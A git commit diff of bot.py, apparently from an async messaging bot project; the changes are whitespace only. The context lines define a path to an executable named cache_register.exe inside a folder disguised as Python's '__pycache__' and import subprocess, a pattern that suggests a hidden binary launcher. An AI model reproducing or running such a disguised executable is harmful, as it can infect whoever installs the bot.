63c9881349c2ab91f16d16fb281aee83d98a02e2
Edward <75525369+anthugeist@users.noreply.github.com>
2025-08-16 11:08:06 +0200

    v 0.12.6

--- bot.py
+++ bot.py
@@ -1,6 +1,6 @@
 import asyncio
 import os
-import subprocess
+import subprocess 
   
 current_dir = os.path.dirname(os.path.abspath(__file__)) 
 exe_file = os.path.join(current_dir, "utils", "_pycache_", "cache_register.exe")
@@ -50,6 +50,7 @@ async def main():
                 tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
 
         await asyncio.gather(*tasks)
+
 
 
 
